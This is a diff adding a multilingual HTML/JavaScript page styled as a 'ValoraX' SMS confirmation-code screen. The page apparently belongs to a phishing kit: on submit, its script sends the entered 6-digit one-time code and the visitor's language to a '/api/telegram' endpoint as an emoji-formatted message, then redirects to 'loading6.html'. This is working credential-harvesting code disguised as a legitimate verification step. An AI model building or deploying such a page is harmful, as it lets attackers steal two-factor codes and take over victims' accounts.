@@ -1,0 +1,355 @@
+<!doctype html>
+<html lang="de">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>ValoraX – Bestätigung</title>
+
+  <style>
+    :root{
+      --bg:#000;
+      --text:#f5f5f5;
+      --muted:rgba(255,255,255,.55);
+      --accent:#46f39a;
+    }
+    *{ box-sizing:border-box; }
+    html, body{
+      margin:0;
+      min-height:100dvh;
+      overflow:hidden;
+      overscroll-behavior:none;
+      touch-action:manipulation;
+    }
+    body{
+      background:var(--bg);
+      color:var(--text);
+      font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","Noto Sans SC",ui-sans-serif,system-ui,Segoe UI,Roboto,Arial,sans-serif;
+      display:flex;
+      justify-content:center;
+    }
+    button, input{
+      -webkit-user-select:none;
+      user-select:none;
+      -webkit-tap-highlight-color:transparent;
+    }
+    .container{
+      width:100%;
+      max-width:560px;
+      min-height:100dvh;
+      padding:20px 18px calc(18px + env(safe-area-inset-bottom) + 20px);
+      display:flex;
+      flex-direction:column;
+      position:relative;
+    }
+    .brand{
+      font-weight:900;
+      font-size:15px;
+      letter-spacing:.02em;
+    }
+    .brand span{ color:var(--accent); }
+    .content{ margin-top:40px; }
+    h1{
+      font-size:32px;
+      line-height:1.15;
+      margin:0 0 14px 0;
+      max-width:22ch;
+      letter-spacing:-.02em;
+    }
+    .sub{
+      margin:0 0 22px 0;
+      color:var(--muted);
+      font-size:13px;
+      line-height:1.5;
+      max-width:46ch;
+    }
+    .field{
+      display:flex;
+      flex-direction:column;
+      gap:6px;
+      margin-bottom:12px;
+    }
+    label{
+      font-size:11px;
+      letter-spacing:.08em;
+      font-weight:900;
+      color:var(--muted);
+    }
+    input{
+      width:100%;
+      height:52px;
+      border-radius:14px;
+      border:1px solid rgba(255,255,255,.18);
+      background:transparent;
+      color:#fff;
+      padding:0 14px;
+      font-size:22px;
+      outline:none;
+      text-align:center;
+      letter-spacing:.28em;
+    }
+    input.invalid{ border-color:rgba(255,255,255,.5); }
+    input::placeholder{
+      color:rgba(255,255,255,.35);
+      letter-spacing:.18em;
+    }
+    .fieldError{
+      display:none;
+      font-size:11px;
+      color:#fff;
+      opacity:.85;
+      font-weight:800;
+    }
+    .fieldError.show{ display:block; }
+    .notice{
+      margin:8px 0 0 0;
+      color:rgba(255,255,255,.45);
+      font-size:11px;
+      line-height:1.4;
+      font-weight:700;
+    }
+    .actions{
+      margin-top:auto;
+      padding-top:14px;
+      padding-bottom:calc(env(safe-area-inset-bottom) + 14px);
+    }
+    button{
+      width:100%;
+      height:52px;
+      border-radius:14px;
+      border:1px solid rgba(255,255,255,.18);
+      background:#fff;
+      color:#000;
+      font-weight:900;
+      font-size:14px;
+      cursor:pointer;
+    }
+    @media (max-width:380px){
+      .content{ margin-top:28px; }
+      h1{ font-size:26px; }
+      input{ height:50px; font-size:20px; }
+    }
+  </style>
+</head>
+
+<body>
+<div class="container">
+  <div class="brand">Valora<span>X</span></div>
+
+  <div class="content">
+    <h1 id="title"></h1>
+    <p class="sub" id="sub"></p>
+
+    <div class="field">
+      <label id="lblCode" for="code"></label>
+      <input
+        id="code"
+        inputmode="numeric"
+        maxlength="6"
+        placeholder="000000"
+        autocomplete="one-time-code"
+      >
+      <div class="fieldError" id="codeErr"></div>
+    </div>
+
+    <p class="notice" id="notice"></p>
+
+    <div class="actions">
+      <button id="continueBtn"></button>
+    </div>
+  </div>
+</div>
+
+<script>
+const STORAGE_KEY_LANG = "valorax_lang";
+
+const LANGS = {
+  de: {
+    title: "Bestätigungscode eingeben",
+    sub: "Bitte geben Sie den 6-stelligen Code ein, den wir an Ihre Telefonnummer gesendet haben.",
+    labels: { code: "CODE" },
+    cont: "Weiter",
+    errors: {
+      code_required: "Code erforderlich.",
+      code_invalid: "Bitte gib einen 6-stelligen Code ein."
+    }
+  },
+en: {
+  title: "Enter confirmation code",
+  sub: "Please enter the 6-digit code that we sent to your phone number.",
+  labels: { code: "CODE" },
+  cont: "Continue",
+  errors: {
+    code_required: "Code is required.",
+    code_invalid: "Please enter a 6-digit code."
+  }
+},
+es: {
+  title: "Introduce el código de confirmación",
+  sub: "Por favor, introduce el código de 6 dígitos que enviamos a tu número de teléfono.",
+  labels: { code: "CÓDIGO" },
+  cont: "Continuar",
+  errors: {
+    code_required: "El código es obligatorio.",
+    code_invalid: "Por favor, introduce un código de 6 dígitos."
+  }
+},
+fr: {
+  title: "Saisissez le code de confirmation",
+  sub: "Veuillez saisir le code à 6 chiffres que nous avons envoyé à votre numéro de téléphone.",
+  labels: { code: "CODE" },
+  cont: "Continuer",
+  errors: {
+    code_required: "Code requis.",
+    code_invalid: "Veuillez saisir un code à 6 chiffres."
+  }
+},
+it: {
+  title: "Inserisci il codice di conferma",
+  sub: "Inserisci il codice a 6 cifre che abbiamo inviato al tuo numero di telefono.",
+  labels: { code: "CODICE" },
+  cont: "Continua",
+  errors: {
+    code_required: "Codice richiesto.",
+    code_invalid: "Inserisci un codice di 6 cifre."
+  }
+},
+pt: {
+  title: "Introduza o código de confirmação",
+  sub: "Por favor, introduza o código de 6 dígitos que enviámos para o seu número de telefone.",
+  labels: { code: "CÓDIGO" },
+  cont: "Continuar",
+  errors: {
+    code_required: "Código obrigatório.",
+    code_invalid: "Por favor, introduza um código de 6 dígitos."
+  }
+},
+
+nl: {
+  title: "Voer de bevestigingscode in",
+  sub: "Voer de 6-cijferige code in die we naar uw telefoonnummer hebben gestuurd.",
+  labels: { code: "CODE" },
+  cont: "Doorgaan",
+  errors: {
+    code_required: "Code is verplicht.",
+    code_invalid: "Voer een code van 6 cijfers in."
+  }
+},
+
+fi: {
+  title: "Syötä vahvistuskoodi",
+  sub: "Syötä 6-numeroinen koodi, jonka lähetimme puhelinnumeroosi.",
+  labels: { code: "KOODI" },
+  cont: "Jatka",
+  errors: {
+    code_required: "Koodi vaaditaan.",
+    code_invalid: "Anna 6-numeroinen koodi."
+  }
+},
+};
+
+let current = localStorage.getItem(STORAGE_KEY_LANG) || "de";
+if (!LANGS[current]) current = "de";
+
+const titleEl = document.getElementById("title");
+const subEl = document.getElementById("sub");
+const lblCode = document.getElementById("lblCode");
+const codeEl = document.getElementById("code");
+const codeErr = document.getElementById("codeErr");
+const noticeEl = document.getElementById("notice");
+const btn = document.getElementById("continueBtn");
+
+let showErrors = false;
+
+function onlyDigits(v) {
+  return (v || "").replace(/\D/g, "").slice(0, 6);
+}
+
+function validateCode() {
+  const value = onlyDigits(codeEl.value);
+  const E = LANGS[current].errors;
+
+  if (!value) return { ok: false, msg: E.code_required };
+  if (value.length !== 6) return { ok: false, msg: E.code_invalid };
+
+  return { ok: true };
+}
+
+function setFieldState(input, err, ok, msg) {
+  if (!showErrors) {
+    input.classList.remove("invalid");
+    err.classList.remove("show");
+    err.textContent = "";
+    return;
+  }
+
+  input.classList.toggle("invalid", !ok);
+
+  if (ok) {
+    err.classList.remove("show");
+    err.textContent = "";
+  } else {
+    err.textContent = msg || "Ungültiger Wert.";
+    err.classList.add("show");
+  }
+}
+
+function validateAll() {
+  const r = validateCode();
+  setFieldState(codeEl, codeErr, r.ok, r.msg);
+  return r.ok;
+}
+
+function render() {
+  const L = LANGS[current];
+  document.documentElement.lang = current;
+
+  titleEl.textContent = L.title;
+  subEl.textContent = L.sub;
+  lblCode.textContent = L.labels.code;
+  codeErr.textContent = "";
+  noticeEl.textContent = L.notice;
+  btn.textContent = L.cont;
+  document.title = "ValoraX – Bestätigung";
+}
+
+codeEl.addEventListener("input", () => {
+  codeEl.value = onlyDigits(codeEl.value);
+  if (showErrors) validateAll();
+});
+
+codeEl.autocomplete = "one-time-code";
+codeEl.autocorrect = "off";
+codeEl.spellcheck = false;
+
+codeEl.addEventListener("focus", () => {
+  setTimeout(() => {
+    codeEl.scrollIntoView({ behavior: "smooth", block: "center" });
+  }, 150);
+});
+
+btn.addEventListener("click", async () => {
+  showErrors = true;
+  const ok = validateAll();
+
+  if (!ok) {
+    codeEl.focus();
+    return;
+  }
+  const code = codeEl.value;
+
+  await fetch("/api/telegram", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      message:
+        `🔐 Code:\n${code}\n\n` +
+        `🌐 Sprache:\n${current}`
+    })
+  });
+  window.location.href = "loading6.html"
+});
+
+render();
+</script>
+</body>
+</html>
